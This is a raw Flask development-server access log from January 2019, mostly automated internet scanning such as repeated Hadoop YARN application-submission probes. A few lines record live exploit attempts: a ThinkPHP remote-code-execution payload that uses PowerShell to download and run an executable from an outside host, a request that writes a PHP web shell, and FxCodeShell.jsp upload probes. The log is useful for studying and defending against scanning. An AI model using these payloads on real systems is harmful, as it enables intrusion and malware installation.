 * Serving Flask app "application" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
Traceback (most recent call last):
  File "application.py", line 149, in <module>
    app.run(host='0.0.0.0', port='8080', debug=False, threaded=True)
  File "/home/face_user/showRoom/venv/lib/python3.6/site-packages/flask/app.py", line 943, in run
    run_simple(host, port, self, **options)
  File "/home/face_user/showRoom/venv/lib/python3.6/site-packages/werkzeug/serving.py", line 814, in run_simple
    inner()
  File "/home/face_user/showRoom/venv/lib/python3.6/site-packages/werkzeug/serving.py", line 774, in inner
    fd=fd)
  File "/home/face_user/showRoom/venv/lib/python3.6/site-packages/werkzeug/serving.py", line 660, in make_server
    passthrough_errors, ssl_context, fd=fd)
  File "/home/face_user/showRoom/venv/lib/python3.6/site-packages/werkzeug/serving.py", line 577, in __init__
    self.address_family), handler)
  File "/usr/lib64/python3.6/socketserver.py", line 453, in __init__
    self.server_bind()
  File "/usr/lib64/python3.6/http/server.py", line 136, in server_bind
    socketserver.TCPServer.server_bind(self)
  File "/usr/lib64/python3.6/socketserver.py", line 467, in server_bind
    self.socket.bind(self.server_address)
OSError: [Errno 98] Address already in use
 * Serving Flask app "application" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:8088/ (Press CTRL+C to quit)
218.28.245.246 - - [12/Jan/2019 18:02:36] "GET /public/index.php?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://a46.bulehero.in/download.exe','C:/5.exe');start%20C:/5.exe HTTP/1.1" 404 -
218.28.245.246 - - [12/Jan/2019 18:02:36] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%5E%3C?php%20$action%20=%20$_GET%5B'xcmd'%5D;system($action);?%5E%3E%3Ehydra.php HTTP/1.1" 404 -
218.28.245.246 - - [12/Jan/2019 18:02:36] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://a46.bulehero.in/download.exe','C:/5.exe');start%20C:/5.exe HTTP/1.1" 404 -
5.101.1.201 - - [12/Jan/2019 18:25:55] "GET /conf HTTP/1.1" 404 -
104.248.202.3 - - [12/Jan/2019 18:46:25] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [12/Jan/2019 19:05:02] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [12/Jan/2019 19:32:36] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [12/Jan/2019 19:44:46] "GET /conf HTTP/1.1" 404 -
104.248.202.6 - - [12/Jan/2019 19:46:55] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [12/Jan/2019 20:18:24] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.10 - - [12/Jan/2019 20:24:43] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [12/Jan/2019 20:45:41] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [12/Jan/2019 20:54:48] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [12/Jan/2019 21:47:29] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [12/Jan/2019 21:51:30] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [12/Jan/2019 22:11:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [12/Jan/2019 22:43:15] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [12/Jan/2019 22:49:46] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [12/Jan/2019 22:50:54] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [12/Jan/2019 22:53:20] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [12/Jan/2019 23:15:18] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [12/Jan/2019 23:57:55] "GET /conf HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 00:00:04] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 00:04:30] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 00:08:24] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 00:15:25] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.10 - - [13/Jan/2019 00:23:54] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [13/Jan/2019 00:24:17] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 00:49:33] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 01:47:39] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [13/Jan/2019 01:50:35] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
106.75.63.218 - - [13/Jan/2019 01:56:40] "GET / HTTP/1.0" 200 -
218.28.20.210 - - [13/Jan/2019 02:16:33] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 404 -
218.28.20.210 - - [13/Jan/2019 02:16:33] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 404 -
218.28.20.210 - - [13/Jan/2019 02:16:33] "PUT /FxCodeShell.jsp/ HTTP/1.1" 404 -
218.28.20.210 - - [13/Jan/2019 02:16:33] "GET /FxCodeShell.jsp?wiew=FxxkMyLie1836710Aa&os=1&address=http://a46.bulehero.in/download.exe HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 02:18:43] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.128.242 - - [13/Jan/2019 02:25:21] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 02:44:57] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 02:51:33] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 02:59:20] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.10 - - [13/Jan/2019 03:01:28] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 03:28:05] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 03:31:11] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 03:38:44] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [13/Jan/2019 03:52:20] "GET /conf HTTP/1.1" 404 -
104.248.202.10 - - [13/Jan/2019 04:17:17] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [13/Jan/2019 04:18:38] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 04:21:16] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 04:29:44] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 04:40:01] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 04:59:56] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 05:15:30] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 05:16:59] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 05:20:00] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 05:25:49] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 05:36:31] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 05:37:13] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
218.28.245.246 - - [13/Jan/2019 05:41:27] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 404 -
218.28.245.246 - - [13/Jan/2019 05:41:27] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 404 -
218.28.245.246 - - [13/Jan/2019 05:41:27] "PUT /FxCodeShell.jsp/ HTTP/1.1" 404 -
218.28.245.246 - - [13/Jan/2019 05:41:27] "GET /FxCodeShell.jsp?wiew=FxxkMyLie1836710Aa&os=1&address=http://a46.bulehero.in/download.exe HTTP/1.1" 404 -
104.248.202.10 - - [13/Jan/2019 05:55:31] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [13/Jan/2019 06:05:27] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 06:10:39] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 06:12:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [13/Jan/2019 06:17:59] "GET /conf HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 06:22:12] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 06:22:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 06:24:16] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 06:35:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 06:35:36] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.10 - - [13/Jan/2019 06:54:54] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [13/Jan/2019 06:59:48] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 07:27:40] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 07:39:11] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 07:44:57] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 07:47:11] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 07:49:20] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 07:59:42] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [13/Jan/2019 08:04:54] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.10 - - [13/Jan/2019 08:48:41] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 08:49:39] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 09:00:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 09:01:01] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 09:01:47] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 09:01:52] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
218.28.245.246 - - [13/Jan/2019 09:32:50] "GET /public/index.php?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://a46.bulehero.in/download.exe','C:/7.exe');start%20C:/7.exe HTTP/1.1" 404 -
218.28.245.246 - - [13/Jan/2019 09:32:50] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%5E%3C?php%20$action%20=%20$_GET%5B'xcmd'%5D;system($action);?%5E%3E%3Ehydra.php HTTP/1.1" 404 -
218.28.245.246 - - [13/Jan/2019 09:32:50] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://a46.bulehero.in/download.exe','C:/7.exe');start%20C:/7.exe HTTP/1.1" 404 -
5.101.1.201 - - [13/Jan/2019 09:39:48] "GET /conf HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 09:57:06] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [13/Jan/2019 10:01:41] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.10 - - [13/Jan/2019 10:14:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 10:17:46] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 10:18:38] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 10:23:47] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 10:27:47] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 10:34:00] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
80.82.78.50 - - [13/Jan/2019 10:38:23] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 -
5.101.1.201 - - [13/Jan/2019 11:16:41] "GET /conf HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 11:22:09] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 11:32:17] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 11:42:02] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 11:42:58] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 11:47:28] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 11:57:14] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 12:22:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
45.55.35.206 - - [13/Jan/2019 12:28:33] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 12:46:53] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 12:58:23] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 13:20:16] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 13:21:23] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 13:28:25] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 14:03:16] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 14:19:48] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 14:23:24] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [13/Jan/2019 14:28:48] "GET /conf HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 14:30:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 14:33:29] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
205.205.150.15 - - [13/Jan/2019 14:40:31] "GET / HTTP/1.1" 200 -
104.248.202.10 - - [13/Jan/2019 14:42:36] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [13/Jan/2019 14:42:53] "GET /conf HTTP/1.1" 404 -
205.205.150.15 - - [13/Jan/2019 14:48:56] "GET / HTTP/1.1" 200 -
68.183.128.242 - - [13/Jan/2019 14:56:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 15:09:01] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 15:35:42] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 15:43:06] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 15:43:27] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 15:52:10] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 16:40:24] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 16:58:41] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 16:58:44] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 17:04:57] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [13/Jan/2019 17:11:17] "GET /conf HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 17:12:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 17:16:42] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
205.205.150.15 - - [13/Jan/2019 18:00:40] "GET / HTTP/1.1" 200 -
205.205.150.15 - - [13/Jan/2019 18:07:13] "GET / HTTP/1.1" 200 -
104.248.202.3 - - [13/Jan/2019 18:09:26] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 18:16:05] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 18:16:45] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 18:19:18] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 18:46:25] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [13/Jan/2019 19:04:39] "GET /conf HTTP/1.1" 404 -
104.248.202.10 - - [13/Jan/2019 19:06:25] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 19:46:01] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [13/Jan/2019 20:15:17] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 20:23:56] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 20:39:18] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [13/Jan/2019 20:39:20] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 20:47:16] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.128.242 - - [13/Jan/2019 21:36:58] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [13/Jan/2019 22:11:16] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.10 - - [13/Jan/2019 22:32:44] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [13/Jan/2019 22:33:17] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 22:38:53] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [13/Jan/2019 22:48:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [13/Jan/2019 22:54:07] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [13/Jan/2019 23:05:31] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [13/Jan/2019 23:06:11] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [13/Jan/2019 23:24:21] "GET /conf HTTP/1.1" 404 -
104.248.202.6 - - [13/Jan/2019 23:37:07] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.128.242 - - [13/Jan/2019 23:56:56] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [14/Jan/2019 00:03:45] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [14/Jan/2019 00:12:12] "GET /conf HTTP/1.1" 404 -
104.248.202.6 - - [14/Jan/2019 00:33:35] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.10 - - [14/Jan/2019 00:56:54] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.128.242 - - [14/Jan/2019 01:21:16] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [14/Jan/2019 01:26:58] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [14/Jan/2019 01:29:26] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [14/Jan/2019 01:30:20] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [14/Jan/2019 01:30:35] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [14/Jan/2019 01:34:33] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [14/Jan/2019 01:36:27] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [14/Jan/2019 01:40:44] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [14/Jan/2019 02:06:15] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [14/Jan/2019 02:08:53] "GET /conf HTTP/1.1" 404 -
68.183.128.242 - - [14/Jan/2019 02:25:48] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [14/Jan/2019 02:30:44] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [14/Jan/2019 02:37:38] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [14/Jan/2019 02:43:23] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [14/Jan/2019 02:44:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
85.93.20.10 - - [14/Jan/2019 02:57:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
85.93.20.10 - - [14/Jan/2019 02:57:21] "  /*à     Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
104.248.202.10 - - [14/Jan/2019 03:01:01] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
178.128.247.161 - - [14/Jan/2019 03:08:49] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [14/Jan/2019 03:09:06] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [14/Jan/2019 03:33:28] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.24.208 - - [14/Jan/2019 03:43:55] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [14/Jan/2019 04:02:59] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.128.242 - - [14/Jan/2019 04:13:08] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.151 - - [14/Jan/2019 04:25:10] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [14/Jan/2019 04:28:37] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [14/Jan/2019 04:29:53] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [14/Jan/2019 04:32:33] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [14/Jan/2019 04:39:25] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [14/Jan/2019 05:04:16] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [14/Jan/2019 05:23:44] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.209.163 - - [14/Jan/2019 05:31:48] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [14/Jan/2019 05:32:03] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
68.183.103.88 - - [14/Jan/2019 06:01:17] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [14/Jan/2019 06:05:32] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [14/Jan/2019 06:20:36] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [14/Jan/2019 06:25:19] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
218.28.245.246 - - [14/Jan/2019 06:26:33] "GET /struts2-rest-showcase/orders.xhtml HTTP/1.1" 404 -
104.248.202.3 - - [14/Jan/2019 06:29:29] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [14/Jan/2019 06:41:11] "GET /conf HTTP/1.1" 404 -
68.183.209.163 - - [14/Jan/2019 06:42:23] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.194.252 - - [14/Jan/2019 07:04:44] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.3 - - [14/Jan/2019 07:15:59] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.245.14 - - [14/Jan/2019 07:22:31] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
104.248.202.6 - - [14/Jan/2019 07:35:11] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 -
5.101.1.201 - - [14/Jan/2019 07:42:02] "GET /conf HTTP/1.1" 404 -
